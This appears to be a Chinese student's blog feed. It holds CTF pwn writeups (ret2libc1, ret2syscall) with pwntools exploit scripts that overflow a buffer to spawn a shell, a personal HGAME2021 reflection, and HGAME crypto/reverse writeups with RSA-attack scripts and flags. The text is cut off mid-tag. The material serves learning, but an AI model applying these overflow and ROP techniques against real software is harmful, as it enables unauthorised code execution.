    <content type="html"><![CDATA[<p>知识点：基本ROP&#x2F;cyclic计算地址偏移&#x2F;ROPgadget&#x2F;有’&#x2F;bin&#x2F;sh’与call _system情况下的系统调用</p><p>先checksec</p><p><img src="/1.png"></p><p>是32位程序，开启了栈堆不可执行保护，打开ida</p><p><img src="/2.png"></p><p>gets函数存在栈溢出，用cyclic计算偏移地址。</p><p>首先生成一个比较大的cyclic值。</p><p><img src="/3.png"></p><p>复制到ret2libc1的gdb里，实现栈溢出。<img src="/4.png"></p><p>这里的小箭头指向的就是要跳转的指令的地址，因为填充的数据不可跳转，就停在了这里，这里的0x62616164就是我们填充进去的cyclic中的某一小段，我们找到这一小段在cyclic中的地址，就可以算出需要填充多少垃圾数据，即劫持返回地址的偏移量。</p><p><img src="/5.png"></p><p>因此我们需要填充112个垃圾数据。</p><p>接下来寻找反汇编程序中是否含有&#x2F;bin&#x2F;sh与system函数</p><p><img src="/6.png"></p><p><img src="/7.png"></p><p>那么有了system和&#x2F;bin&#x2F;sh就可以写exp了，这一题跟系统调用不一样，本题是直接使用call system函数，&#x2F;bin&#x2F;sh应该放在栈中作为函数参数，但是系统调用需要把参数放入寄存器中，以int 80h作为函数参数。</p><p>exp</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="hljs-variable">context.log_level</span> = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-variable">gdb.attach</span>(<span class="hljs-variable">p</span>)<br><span class="hljs-variable">binsh</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08048720</span><br><span class="hljs-variable">system</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08048460</span><br><br><span class="hljs-variable">p.recvuntil</span>(<span class="hljs-string">&#x27;RET2LIBC &gt;_&lt;\n&#x27;</span>)<br><span class="hljs-variable">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">system</span>) + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-title">p32</span>(<span class="hljs-variable">binsh</span>)</span><br><span class="hljs-variable">p.send</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2syscall</title>
    <link href="/2021/03/10/ret2syscall/"/>
    <url>/2021/03/10/ret2syscall/</url>
    
    <content type="html"><![CDATA[<p>知识点：基本ROP&#x2F;ROPgadget&#x2F;有’&#x2F;bin&#x2F;sh’情况下的系统调用</p><p>打算跟着ctf wiki一题一题地学起，手动实践的时候还是能学到很多东西的。</p><p>首先是checksec，是32位程序，开启了栈堆不可执行保护，因此不能用shellcode来提权。</p><p><img src="/1.png"></p><p>打开ida查看源代码，存在gets函数栈溢出漏洞</p><p><img src="/2.png"></p><p>然后再搜索一下system和&#x2F;bin&#x2F;sh，发现只有&#x2F;bin&#x2F;sh</p><p><img src="/3.png"></p><p>那么可以通过gadgets构建ROP链，实现系统调用，具体资料如下</p><p><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></p><p>简而言之就是需要利用gadgets实现函数execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)，那么应该往eax存入0xb（系统调用号），往ebx存入“&#x2F;bin&#x2F;sh”（通过pop ebx实现），往ecx与edx中存入0。尽管这是32位程序，函数调用参数通常是使用栈上数据，但在使用系统调用时，需要修改寄存器达到系统调用目的。</p><p>那么接下来就要寻找合适的gadgets。</p><p><img src="/4.png"></p><p>用图上两个地方的gadgets就可以实现寄存器的修改。</p><p>接下来寻找&#x2F;bin&#x2F;sh和int 80h的地址，就可以将&#x2F;bin&#x2F;sh pop入ebx中，并在最后调用int80h。</p><p><img src="/5.png"></p><p>那么全部地址都凑齐了，就可以写exp了</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./rop&#x27;</span>)</span><br><span class="hljs-variable">context.log_level</span> = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-variable">gdb.attach</span>(<span class="hljs-variable">p</span>)<br><br><span class="hljs-variable">binsh</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080be408</span><br><span class="hljs-variable">int80</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08049421</span><br><span class="hljs-variable">edx_ecx_ebx_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x0806eb90</span><br><span class="hljs-variable">eax_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080bb196</span>    <span class="hljs-comment">//通过ROPgadget获取到的信息</span><br><br><span class="hljs-variable">p.recvuntil</span>(<span class="hljs-string">&#x27;What do you plan to do?\n&#x27;</span>)<br><span class="hljs-variable">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">eax_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">xb</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">edx_ecx_ebx_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">binsh</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">int80</span>)</span><br><span class="hljs-comment">//填充垃圾数据--系统调用号pop入eax并返回--exceve函数参数pop入对应寄存器并返回--调用int 80h</span><br><br><span class="hljs-variable">p.send</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2021-学期小结</title>
    <link href="/2021/03/03/HGAME%E5%AF%92%E5%81%87/"/>
    <url>/2021/03/03/HGAME%E5%AF%92%E5%81%87/</url>
    
    <content type="html"><![CDATA[<h2 id="关于大一上"><a href="#关于大一上" class="headerlink" title="关于大一上"></a>关于大一上</h2><p>​第一学期在一个比较混乱又匆忙的学习中匆匆度过了，在我的记忆中这段时间其实是非常迷茫的，经历了比较多的焦虑，在很多方面比如绩点、考研、内卷之类的奇怪问题有时候有过度的在意，也结交到了一些朋友，总体上我认为是属于一个探索的阶段，但是在第一学期其实在能力上没有什么长进，大部分空余时间在看《c primer plus》（虽然现在还剩一小部分没看完），反思过来在学习方法上的缺点其实跟以前是差不多的，在对于要学的东西的整体上了解太少，导致对于要学什么、怎么学的认知太片面了，当时的我是发现了一点点对安全方面的兴趣</p><p>，但是对互联网很多东西了解本来就比较少，以至于不知道从哪里开始入门，厘清各种安全方向也花了一点时间，在学期末的时候有特别棒的学姐来找我交流，才慢慢对安全方面有了一点认识，12月30日，第一次在buuctf尝试看着别人的wp做了一道入门的pwn题，在那一小段时间里，搭建了博客，又在buuctf照着wp做了几题，然后发现我在汇编上面的基础确实太薄弱了，甚至很多很基础的操作也不会（比如看ida啥的）在此之前基本只学过c语言和一点点c++，对于很多ctf的工具、要提前学的东西什么的都没有准备，就先开始了看汇编语言，关于这个最感激的还是那位学姐orz，只是大概十来天后就开始期末备考和考试周了，于是这些事情也搁置了下来，匆匆忙忙考完试，这个学期也就匆匆忙忙地结束了。</p><h2 id="关于HGAME2021"><a href="#关于HGAME2021" class="headerlink" title="关于HGAME2021"></a>关于HGAME2021</h2><p>​1.28结束考试回家后，就着手准备下等待30号的hgame了，这个时候的几天属于不知道要干什么但是还是干一下吧的状态，由于根本也没太多接触ctf的题型，就还是瞎逛了一下buuctf，做了一点basic题目，阅读汇编语言（上学期没看多少就要备考了，所以还剩挺多的），然后做了下兔兔的题有点云里雾里。</p><h3 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h3><p>​30号hgame开始那两三天，是先做了misc的两题，还有两三题有尝试过但是没办法做出来orz，然后做出了pwn的签到题，并且看了看其他pwn题的题型，该怎么说呢，在做misc和crypto的时候，完全是依靠百度上别人的blog来做，解密题其实还好，就找“ctf密码学题型总结”啥的（doge），还是能得到比较全面的认识。做misc-galaxy的时候其实耗费了很多时间，因为以前根本没接触过流量分析是啥玩意，个人体质也属于web黑洞（，看web资料有点像看天书，所以对于这题其实是一点一点google从“apk文件是什么”查起的，虽然最后是做出来了这道题，但是关于流量分析还是不太了解，只会真·瞎点（我觉得主要原因还是在于web知识的匮乏），对于图片隐写方面还是学习到了很多，做完这道题又尝试做了其他的crypto和misc题目，觉得这两个题型在没啥入门经验的时候，真的是很容易自己误导自己啊，做题的时候只能半猜半做，看着别人blog一点点尝试，有时甚至坚定地认为某个方法是对的（真是太年轻），然后week1的时候也不太敢问出题人，就自己反复撞墙。crypto1和misc2卡了许久，甚至不知道压缩包能直接密码爆破……网上的资料过于综合，适用别的题目的方法其实不一定适用于我做的题，就还是学到了很多知识但是解不出题，也不知道哪些资料适用于这个题，就浪费了挺多时间。最智障的是完全忘记了ctf wiki的存在，后面才翻出来，提高了一点效率。</p><p>​week1在反复撞墙中做题花了有三四天这样，但是收获并不多，并且几乎没有去看pwn题，反思了半小时决定还是尝试学习一下pwn看看能不能得分。然后很迷茫的下载了letter看了ida，发现汇编也看不懂，只知道是个栈溢出，溢出以后怎么getshell也不知道，茫然地看了一会，又茫然地google了下“pwn 没有system函数”，然后又反思了半小时，决定还是先看完汇编。花了两天快马加鞭囫囵吞枣看完汇编后（跳过了一点点题目，主要还是答案看懂了就过，不是好做法），又打开了ida看，发现还是不知道怎么做，只有汇编比之前懂一点（，在大量的google搜索后，其实分不清shellcode和ROP啥的，只是眼熟了这些词，还有ret2libc123啥的（这个时候还没想起来开wiki看看），还花了大量时间重装一个kali和安装各种各样的软件，比如pwndbg和python（python也是刚接触没多久，对它有深深的恐惧），大量google后，我茫然地觉得letter应该是属于ret2libc3题型，当时并不知道shellcode和泄露libc是哪些适用的题型，也不知道shellcode原来是不用自己写的（doge），就尝试用别人的exp改一下看看能不能用，结果当然是疯狂报错，期间倒是学习到了很多pwn基础的知识，啃栈溢出原理和泄露原理，因为不熟悉python也不熟悉pwntools，更不会用gdb，就很茫然地在google搜索各种“pwn入门教程”中度过了这一周，当然分数也意料之中地很低（doge）。</p><h3 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h3><p>​第二周开始是先做了crypto，先做了白给的RSA题，对RSA有了比较多的了解，也找到了比较全面的资料，做那几题RSA的时候还是比较顺利的，也是学到了很多东西。然后做misc，misc1卡了特别特别久，其实密码和工具都拿到了，然后愣是不知道输密码要加“ ”orzzzzz，就没做出这题。misc2和3的话其实耗时也是比较多的，只能感慨搜索引擎的强大，慢慢地一点一点google还是能找出来，就是misc3的时候以为那串base64码是data url，卡了比较长的时间，后来问热心学长也顺利解决了问题，做完这些事情已经过去了三四天了，然后误打误撞地尝试做RE，慢慢推理也做了出来。但由于week2又是过年，家里事情比较繁忙，时间也比较少，基本上只有一些零碎一点的时间可以看看资料，然后week2就也这样过去了。但是这周虽然做出的题比上一周多，但是我在pwn上的提高几近为0，其实是不怎么满意的orz，最主要还是更想学pwn，但是pwn对我来说困难还是太多了，不好得分，就只能把它往后放放。</p><h3 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h3><p>​第三周是同样的先做crypto和misc，但是这周的题难度确实比上周大了不少，不断尝试和碰壁之后，做出了两道crypto题，上一周学到的RSA知识在这周还是很管用的，另外在练习写脚本和改脚本的过程中，脚本能力也有了很大进步，至少对长脚本不那么害怕了orz。但是这周的misc我看题目确实没办法做出来，结束以后看wp发现主要问题还是对web知识匮乏（web又又又来了），wireshark也看不出个什么，就很茫然的做了很久的无用功，google流量分析找到的blog好像也不太适合这些题目，茫然地找了很久也找不到什么方向，遂弃之。接下来的几天就打算从头看一下wiki的pwn板块，从栈溢出开始看起，然后上网找了一些例题看wp，又学了学pwntools之类的，对于pwn题的理解确实也提高了不少，但是都是看别人的解题过程，自己解题的能力很低，然后尝试做pwn题的时候确实遇到了挺多困难的，而且根本不知道问题出在哪里、该怎么解决（，照着别人的脚本去写，但是返回信息不知道在哪里出了问题，orz然后就重新先去学gdb之类的，到week3结束也没能做出那道题，其实对自己还是挺失望的，感觉还是得先从一些更简单的题目慢慢练起，对程序的很多知识理解得不透就去照着别人的脚本做题，白白浪费了很多时间还做不出题目，得不到提高，这就是浮沙筑高台的结果（doge）。</p><h3 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h3><p>​第四周相比前三周来说，其实是最痛苦的一周，前面几天一直在做crypto和misc，crypto1这题确实暴露了我在使用python的脚本能力上很大的弱点，找到了比较全面的资料也能理解，但是在自己动手写脚本的时候就遇到特别多的困难，包括在使用一些函数和库方面，还有在解决报错方面，在debug上等等，由于之前大部分是使用现有的轮子进行修改，基本上都能不出错，但是这次是要自己写脚本，就问题还是在于python用的太少，以至于找不到问题的解决方法。接下来是尝试做了其他crypto、misc、pwn题，都不太找得到思路，然后又因为前面crypto1脚本一直报错又找不到解决方法，再加上总分数比较靠后，人已经陷入比较大的焦虑里，到了周四周五的时候，不太能找到做题的方向，丧失了很大的信心，又因为前几周积累的压力可能比较大，精神状态变得有点糟糕，最后两天是放下了题目决定休息一下准备开学了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​最后虽然没进final，我也做好了没进的准备了orz，但是从整个比赛来说，最珍贵的应该是对ctf各种方向的学习内容和方向有了大致初步的了解，而且也找到了一些好的学习网站，相比于一开始的我确实是成长了非常多，具备了一定的自主学习能力和学习方向，可以不那么依赖外界的帮助，也发现了自己对安全是比较有兴趣的。但是其实还是有点缺憾，这一个月下来的结果其实跟我一开始设想不太一样，我在整个比赛中主要做的还是crypto和misc，但是我一直更想学的还是pwn，只是因为这两个方向好得分一点，而且我在pwn上的基础可以说几乎没有，就没办法在这个方向上得分，所以整个比赛下来自己是比较功利性的（这也是我焦虑的来源），把大部分时间都放在容易得分的题目上，我在pwn方向上的提高并没有我期望的那么高，就这点而言，我就觉得我暂时是配不上进入vidar的，所以也打算今年多去尝试自主学习，沉淀下自己的能力，明年再尝试一次。</p><h2 id="接下来的规划"><a href="#接下来的规划" class="headerlink" title="接下来的规划"></a>接下来的规划</h2><p>​下学期除了多花时间在安全方面，在这方面的兴趣还是比较浓厚的，也有意向自学一下java和go语言的用法，暑期与同学一起尝试自己写一个博客，但是最主要的还是从比较基础的知识学习一下pwn，希望能够有令自己满意的提高。</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2021-week3-writeup</title>
    <link href="/2021/03/02/HGAME2021-week3-writeup/"/>
    <url>/2021/03/02/HGAME2021-week3-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LikiPrime"><a href="#LikiPrime" class="headerlink" title="LikiPrime"></a>LikiPrime</h3><p>打开文件，注意到n巨大，无法直接分解，就安装下RsaCtfTool</p><p>把n，e转换为pem格式</p><p><img src="/likip1.png"></p><p>然后将公钥复制进公钥文件里，根据公钥生成私钥</p><p><img src="/likip2.png"></p><p>复制生成私钥文件</p><p><img src="/likp3.png"></p><p>这个时候我们得到了私钥的pem格式，这个也就是说包含了d的信息，就可以把pem文件转化为n，d的信息</p><p><img src="/likip4.png"></p><p>把d复制出来，就可以使用普通的rsa解密脚本了，这里有个小知识是，此时尽管我们得到了p和q，但是在产生n且生成公钥后，p和q就对解密没有作用了，只需n,e,d,m即可知三求四</p><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> libnum import *<br>import gmpy2<br><span class="hljs-attribute">n</span>=4642849048052035496503633704895293631217710721048480643093066273453539020606503262957979920725495980644474381582401987659483845087785158995583524801974411600660004469521606043828464398381268385741839106107679152285268052785693531737782078311412427416352729645020533101979297815795100035083401887319200662906616821028586789590684789335443762752043629342084834798459618090474753253355410561025472128675037918666523107644910740766105028826314730599018497495492862063800728778692600588195828882048829807212192836385765558385158246669780622288906919083808249111381934780442102461915714453842511870245498903113416571527386297776743000577518964642712819636358630943232264563917498926813595742655374586197861677713568434392710229546068989680236075964913194705687047171077181794254991201877951298787735833716867844575889175057579515311685026867586635553290478360204470269221020803623311502253981426403357439672206326373095909967452469101986678489532087651064918868164697149776944867269827599290237695205317934537972522935809557398527602978413852968190796168743729293895475224641537<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-attribute">c</span>=3709687551802386646797745785768157879027050609328977568885694731790584712579460465408758306613418567415962830795763454102850272567805909067742475171434530819531323376762844483425142978584670535444556910298311158785244674346185024586744190434166742125402447427024641211299910710700413830069657814167275425086366608186529488973158968024470128222042394722196376369742747012091512362855985796568473133834299704823506724715371622279556576084964319045329385472170502455939280390354138230655997516781374667410921562926248428641624886673723671977041119253922097666216435834216534775971559961023171740810001108875247411400798441332102418344668326564692867689781292248240788343422559465238855056753381648550466898132110941192653170182675007266069504079999064268167773997215580322970078352817713636962794995378965132037968244297009426849367741958926566007286341995187592351353620716142926816093473621244503025516637410519157727321213682617984888429087571356484732639348442588172026432665938014397255748542136399980171709114519127932101071316178153942329339451067510373501385994955068<br><span class="hljs-attribute">d</span>=770773725419322614736096170243691269170830105818201464773373225127401384625459747943647428742441617245401548310367176186508144018723812958663789154912211395321434435942979900771376362274565513173798151799007418357015371687876247391657674474391064746477832347190493921747024737718398589830285373667285704448235210839541392964991539252172484836691253600895417895345234673914968878595402017952065468371953229793264961110654093070865344182897907601093245813936874030965739554262217795080183921897180793596028747028738137662679597765188531565728887340986161397150246232036553519792079001163180694624897916603106343065963758602553926821994399899387763161456806939859495324306883688456099721430769144536235331619886299618985907519204331418792099350868416283322724256163197443146202212692357518249688129160250090117488224473364207648003633976797404611385404362182887064564770724540482831043005176387272197349168925019470641628096392062982237553509096120775879454378983657609664663657876869899429824195166894468110681582491514529961338691940192460421091657400961588382452823337473<br><br><span class="hljs-attribute">m</span>=pow(c,d,n)<br><span class="hljs-built_in">print</span>(hex(m))<br><span class="hljs-attribute">m</span>=n2s(m)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h3 id="HappyNewYear"><a href="#HappyNewYear" class="headerlink" title="HappyNewYear!!"></a>HappyNewYear!!</h3><p>打开output发现是7组e,n,c，且e相同，可以推测是低加密指数广播攻击，用普通的脚本试了下发现是堆乱码</p><p><img src="/ne1.png"></p><p>推测7组信息并非由同一个message得来，就加个循环，排列组合，每次用三组明文求密文</p><p>exp</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs prolog">import random<br>from gmpy2 import invert, iroot<br>from libnum import *<br><br>n1=...<br>c1=...<br>n2=...<br>c2=...<br>...<br>...    #篇幅过长省略，把output复制进来<br>e=<span class="hljs-number">3</span><br><br>def broadcast(n1, n2 ,n3, c1, c2, c3):<br>    n = [n1, n2, n3]<br>    <span class="hljs-symbol">C</span> = [c1, c2, c3]<br>    <span class="hljs-symbol">N</span> = <span class="hljs-number">1</span><br>    for i in n:<br>        <span class="hljs-symbol">N</span> *= i<br><br>    <span class="hljs-symbol">Ni</span> = []<br>    for i in n:<br>        <span class="hljs-symbol">Ni</span>.append(<span class="hljs-symbol">N</span> / i)<br><br>    <span class="hljs-symbol">T</span> = []<br>    for i in xrange(<span class="hljs-number">3</span>):<br>        if(gcd(<span class="hljs-symbol">Ni</span>[i],n[i]) == <span class="hljs-number">1</span>):<br>            <span class="hljs-symbol">T</span>.append(long(invert(<span class="hljs-symbol">Ni</span>[i], n[i])))<br>        else:<br>            return <span class="hljs-number">0</span><br><br>    <span class="hljs-symbol">X</span> = <span class="hljs-number">0</span><br>    for i in xrange(<span class="hljs-number">3</span>):<br>        <span class="hljs-symbol">X</span> += <span class="hljs-symbol">C</span>[i] * <span class="hljs-symbol">Ni</span>[i] * <span class="hljs-symbol">T</span>[i]<br><br>    m3 = <span class="hljs-symbol">X</span> <span class="hljs-comment">% N</span><br>    m = iroot(m3, <span class="hljs-number">3</span>)<br>    return m[<span class="hljs-number">0</span>]<br><br>def main():<br>    e = <span class="hljs-number">3</span><br>    n=[n1,n2,n3,n4,n5,n6,n7]<br>    c=[c1,c2,c3,c4,c5,c6,c7]<br>    for i in range(<span class="hljs-number">0</span>,<span class="hljs-number">5</span>):<br>        for j in range(i,<span class="hljs-number">6</span>):<br>            for z in range(j,<span class="hljs-number">7</span>):<br>                m = broadcast(n[i],n[j],n[z],c[i],c[j],c[z])<br>                print m<br>                m=n2s(m)<br>                print m<br><br>if <span class="hljs-symbol">__name__</span>==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>然后就在一大堆乱码中得出一点点信息</p><p><img src="/ne2.png"></p><p><img src="/ne3.png"></p><p><code>@ind3r~YOu^9ot=i7&#125;</code></p><p><code>hgame&#123;!f+y0u-pl4y_rem</code></p><p>就得到了flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf-hgame2021</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME2021-week2-writeup</title>
    <link href="/2021/03/02/HGAME2021-week2-writeup-0/"/>
    <url>/2021/03/02/HGAME2021-week2-writeup-0/</url>
    
    <content type="html"><![CDATA[<h1 id="week2-writeup-6vv"><a href="#week2-writeup-6vv" class="headerlink" title="week2-writeup-6vv+"></a>week2-writeup-6vv+</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><p>先输入个hgame{aaaaaaaaaaaaaa}试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs --------------INFO--------------"> <br>eax: 127<br>ebx: 23<br>ecx: 0<br>zf: 0h<br>--------------INFO--------------<br> <br>eax: 127<br>ebx: 127<br>ecx: 0<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 74<br>ebx: 45<br>ecx: 1<br>zf: 0g<br>--------------INFO--------------<br> <br>eax: 74<br>ebx: 74<br>ecx: 1<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 34<br>ebx: 67<br>ecx: 2<br>zf: 0a<br>--------------INFO--------------<br> <br>eax: 34<br>ebx: 34<br>ecx: 2<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 52<br>ebx: 89<br>ecx: 3<br>zf: 0m<br>--------------INFO--------------<br> <br>eax: 52<br>ebx: 52<br>ecx: 3<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 104<br>ebx: 13<br>ecx: 4<br>zf: 0e<br>--------------INFO--------------<br> <br>eax: 104<br>ebx: 104<br>ecx: 4<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 99<br>ebx: 24<br>ecx: 5<br>zf: 0&#123;<br>--------------INFO--------------<br> <br>eax: 99<br>ebx: 99<br>ecx: 5<br>zf: 1<br>--------------INFO--------------<br> <br>eax: 66<br>ebx: 35<br>ecx: 6<br>zf: 0a<br><br></code></pre></td></tr></table></figure><p>可以看到，输入不同字符会改变eax的值，而正确的字符的ascii码为eax异或ebx，然后正确的eax值是zf&#x3D;1时ebx的值，因此只需要计算每一轮zf分别等于0和1时ebx的值的异或，ecx表示循环次数，可以用来判断第几位字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs --------------INFO--------------">eax: 65<br>ebx: 35<br>ecx: 6<br>zf: 0<br>--------------INFO--------------<br> <br>eax: 65<br>ebx: 122<br>ecx: 6<br>zf: 1122 xor 35 = 89 (Y)<br>--------------INFO--------------<br></code></pre></td></tr></table></figure><p>以此一位一位地类推，得到flag</p><p><code>hgame&#123;You_Kn0w_debuGg3r&#125;</code></p><p>就是有点费键盘</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="whitegiveRSA"><a href="#whitegiveRSA" class="headerlink" title="whitegiveRSA"></a>whitegiveRSA</h3><p>公钥与私钥的产生：</p><p>(1)进行加密之前，首先找出2个不同的大质数p和q</p><p>(2)计算n&#x3D;p*q</p><p>(3)根据欧拉函数，求得φ(n)&#x3D;φ(p)φ(q)&#x3D;(p−1)(q−1)</p><p>(4)找出一个公钥e，e要满足: 1&lt;e&lt;φ(n) 的整数，且使e和φ(N)互质。</p><p>(5)根据e*d除以φ(n)余数为1，找到私钥d。</p><p>(6)所以,公钥就是(n,e) 私钥就是(n,d)</p><p>消息加密:</p><p>m^e除以n求余数即为c(密文)</p><p><img src="https://pic4.zhimg.com/80/v2-b217278d1613737321f72d41e5a37453_1440w.jpg" alt="img"></p><p>消息解密:</p><p>c^d除以n求余数即为m(明文)</p><p><img 